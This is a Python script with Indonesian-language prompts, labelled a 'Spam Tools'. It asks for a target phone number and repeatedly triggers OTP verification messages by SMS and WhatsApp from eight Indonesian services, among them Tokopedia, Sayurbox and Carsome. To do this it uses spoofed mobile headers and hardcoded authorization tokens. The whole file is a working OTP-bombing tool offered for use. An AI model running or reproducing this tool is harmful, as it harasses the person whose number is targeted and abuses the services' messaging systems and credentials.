import sys        
import subprocess 

try: 
    import requests 
    import time     
    import os      
    import urllib3  
    import re       
    import json     
    
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3"])

finally:
    import requests
    import urllib3

from urllib3.exceptions import *

hijau   = "\033[1;92m"
putih   = "\033[1;97m"
abu     = "\033[1;90m"
kuning  = "\033[1;93m"
ungu    = "\033[1;95m"
merah   = "\033[1;91m"
biru    = "\033[1;96m"


def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.050)

def countdown(time_sec):
    while time_sec:
        mins, secs = divmod(time_sec, 60)
        timeformat = f'\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{mins:02d}:{secs:02d}'
        waktu = time.localtime()
        keterangan_jam = time.strftime("%H:%M:%S", waktu)
        keterangan_tanggal = time.strftime("%d", waktu)
        keterangan_bulan = time.strftime("%B", waktu)
        bulan_bulan = {
            "January": 'Januari', "February": "Februari", "March": "Maret", "April": "April",
            "May": "Mei", "June": "Juni", "July": "Juli", "August": "Agustus", "September": "September",
            "October": "Oktober", "November": "November", "December": "Desember"
        } 
        bulan = bulan_bulan.get(keterangan_bulan)

        keterangan_tahun = time.strftime("%Y", waktu)

        keterangan_hari = time.strftime("%A", waktu)
        hari_hari = {
            "Sunday": 'Minggu', "Monday": "Senin", "Tuesday": "Selasa", "Wednesday": "Rabu",
            "Thursday": "Kamis", "Friday": "Jum'at", "Saturday": "Sabtu"
        }  
        hari = hari_hari.get(keterangan_hari)

        print(f"{timeformat} | {putih}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {putih}Waktu {keterangan_jam}", end='\r')
        time.sleep(1)
        time_sec -= 1

def tanya(nomor):
    while True:
        a = input(f"""{putih}Apakah Kamu ingin mengulangi Spam Tools? y/t {putih}Input Kamu: {putih}""")
        if a.lower() == "y":
            start(nomor, 1)
            break
        elif a.lower() == "t":
            autoketik(f"{putih}Berhasil Keluar Dari Tools!")
            sys.exit()
        else:
            print("Masukan Pilihan Dengan Benar!")

def jam(nomor):
    autoketik("Program Berjalan!")
    b = nomor[1:12] # Contoh nomor = 081319196666
    c = "62" + b    # Contoh nomor = 6281319196666
    rto = False 

    for _ in range(10):
        try:
            # 1
            response_tokopedia = requests.get(
                f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{nomor}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Origin': 'https://accounts.tokopedia.com',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                }
            )
            
            # Debugging response content
            #autoketik(f"{putih}Response Content: {response_tokopedia.text[:200]}...")

            # Extract token from response regex
            token_search = re.search(r'<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', response_tokopedia.text)
            if not token_search:
                autoketik(f"{merah}Gagal mengekstrak token dari response.")
                continue
            
            token = token_search.group(1)

            data_tokopedia = {
                "otp_type": "116",
                "msisdn": nomor,
                "tk": token,
                "email": '',
                "original_param": "",
                "user_id": "",
                "signature": "",
                "number_otp_digit": "6"
            }

            response_tokopedia = requests.post(
                'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Origin': 'https://accounts.tokopedia.com',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                },
                data=data_tokopedia
            )
            
            # 2
            response_misteraladin = requests.post(
                "https://m.misteraladin.com/api/members/v2/otp/request",
                headers={
                    "Host": "m.misteraladin.com",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                    "x-platform": "mobile-web",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://m.misteraladin.com",
                     "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.misteraladin.com/account",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "phone_number_country_code": "62",
                    "phone_number": nomor,
                    "type": "register"
                })
            )

            # 3
            payload = {
                    "event": "default_verification",
                    "mobilePhone": nomor,
                    "sender": "jatissms"
            }
            headers = {
                "LPR-TIMESTAMP": "1603281035821",
                "Accept-Language": "id-ID",
                "LPR-BRAND": "Kredito",
                "LPR-PLATFORM": "android",
                "User-Agent": "okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android",
                "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
                "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "79"
            }

            response_kredito = requests.post(
                "https://app-api.kredito.id/client/v1/common/verify-code/send",
                json=payload,
                headers=headers
            )

            # 4
            response_maucash = requests.get(
                f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={nomor}&channelType=0",
                headers={
                    "Host": "japi.maucash.id",
                    "accept": "application/json, text/plain, */*",
                    "x-origin": "google play",
                    "x-org-id": "1",
                    "x-product-code": "YN-MAUCASH",
                    "x-app-version": "2.4.23",
                    "x-source-id": "android",
                    "accept-encoding": "gzip",
                    "user-agent": "okhttp/3.12.1"
                }
            )
            # 5
            response_tokko = requests.post(
                "https://api.tokko.io/graphql",
                headers={
                    "Host": "api.tokko.io",
                    "content-length": "306",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "x-tokko-api-client": "merchant_web",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-tokko-api-client-version": "4.5.1",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://web.lummoshop.com",
                    "sec-fetch-site": "cross-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://web.lummoshop.com/",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "operationName": "generateOTP",
                    "variables": {
                        "generateOtpInput": {
                            "phoneNumber": "+62" + nomor,
                            "hashCode": "",
                            "channel": "WHATSAPP",
                            "userType": "MERCHANT"
                        }
                    },
                    "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }"
                })
            )

            # 6
            response_sayurbox = requests.post(
                "https://www.sayurbox.com/graphql/v1?deduplicate=1",
                headers={
                    "Host": "www.sayurbox.com",
                    "content-length": "289",
                    "sec-ch-ua-mobile": "?1",
                    "authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-bundle-revision": "6.0",
                    "x-sbox-tenant": "sayurbox",
                    "x-binary-version": "2.2.1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.sayurbox.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "operationName": "generateOTP",
                    "variables": {
                        "destinationType": "whatsapp",
                        "identity": "+62" + nomor
                    },
                    "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
                })
            )

            response_carsome = requests.post(
                "https://www.carsome.id/website/login/sendSMS",
                headers={
                    "Host": "www.carsome.id",
                    "content-length": "38",
                    "x-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "country": "ID",
                    "x-amplitude-device-id": "A4p3vs1Ixu9wp3wFmCEG9K",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.carsome.id",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.carsome.id/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "username": nomor,
                    "optType": 1
                })
            )

            response_ruparupa = requests.post(
                "https://wapi.ruparupa.com/auth/generate-otp",
                headers={
                    "Host": "wapi.ruparupa.com",
                    "content-length": "117",
                    "sec-ch-ua-mobile": "?1",
                    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs",
                    "content-type": "application/json",
                    "x-company-name": "odi",
                    "accept": "application/json",
                    "informa-b2b": "false",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "user-platform": "mobile",
                    "x-frontend-type": "mobile",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://m.ruparupa.com",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.ruparupa.com/verification?page=otp-choices",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "phone": nomor,
                    "action": "register",
                    "channel": "chat",
                    "email": "",
                    "token": "",
                    "customer_id": "0",
                    "is_resend": 0
                })
            )


            if response_tokopedia.status_code == 200:
                autoketik(f"{putih}Sukses Mengirim OTP Tokopedia!")
                countdown(60)
                #time.sleep(60)
                rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Tokopedia. Status code: {response_tokopedia.status_code}")

            if response_misteraladin.status_code == 429:
                autoketik(f"{putih}Sukses Mengirim OTP Mister Aladin!")
                countdown(60) 
                #time.sleep(60)
                rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Mister Aladin. Status code: {response_misteraladin.status_code}")

            if response_kredito.status_code == 200:
                    autoketik(f"{putih}Sukses Mengirim OTP Kredito!")
                    countdown(60)
                    #time.sleep(60)
                    rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Kredito. Status code: {response_kredito.status_code}")
            
            if response_maucash.status_code == 200:
                autoketik(f"{putih}Sukses Mengirim OTP dari Maucash!")
                countdown(60)
                #time.sleep(60)
                rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Maucash. Status code: {response_maucash.status_code}")

            if response_tokko.status_code == 200:
                autoketik(f"{putih}Sukses Mengirim OTP Tokko!")
                countdown(60)
                #time.sleep(60)
                rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Tokko. Status code: {response_tokko.status_code}")

            if response_sayurbox.status_code == 200:
                autoketik(f"{putih}Sukses Mengirim OTP Sayurbox!")
                countdown(60)
                #time.sleep(60)
                rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Sayurbox. Status code: {response_sayurbox.status_code}")

            if response_carsome.status_code == 200:
                autoketik(f"{putih}Sukses Mengirim OTP Carsome!")
                countdown(60)
                #time.sleep(60)
                rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Carsome. Status code: {response_carsome.status_code}")
            
            if response_ruparupa.status_code == 200:
                autoketik(f"{putih}Sukses Mengirim OTP Rupa-rupa!")
                countdown(60)
                time.sleep(60)
                rto = False
            else:
                autoketik(f"{merah}Gagal mengirim OTP Rupa-rupa. Status code: {response_ruparupa.status_code}")
            
        except requests.exceptions.ConnectionError:
            autoketik(f"{merah}Gagal membuat koneksi baru!")
            time.sleep(1000) 
            rto = True

        except urllib3.exceptions.NewConnectionError:
            autoketik(f"{merah}Gagal membuat koneksi baru!")
            time.sleep(1000) 
            rto = True
        
        except TimeoutError:
            autoketik(f"{merah} Upaya Koneksi Gagal!")
            time.sleep(1000) 
            rto = True
        
        except urllib3.exceptions.ProtocolError:
            autoketik(f"{merah} Upaya Koneksi Gagal!")
            time.sleep(1000) 
            rto = True
        
        except KeyboardInterrupt:
            tanya(nomor)

    if not rto:
        tanya(nomor)

def start(nomor, mode):
    try:
        os.system("cls") if os.name == "nt" else os.system("clear")
        if mode == 0:
            autoketik(f"{putih}Nomor Target {putih}: {hijau}{nomor}{putih}")
        jam(nomor)
    except KeyboardInterrupt:
        tanya(nomor)

def tobrut():
    os.system("cls") if os.name == "nt" else os.system("clear")
    autoketik(f"{putih}Contoh Penulisan Nomor: {hijau}08123123123 / 628123123123{putih}")
    nomor = input(f"{putih}Masukkan Nomor Tujuan {putih}: {hijau}")
    start(nomor, 0)

if __name__ == "__main__":
    tobrut()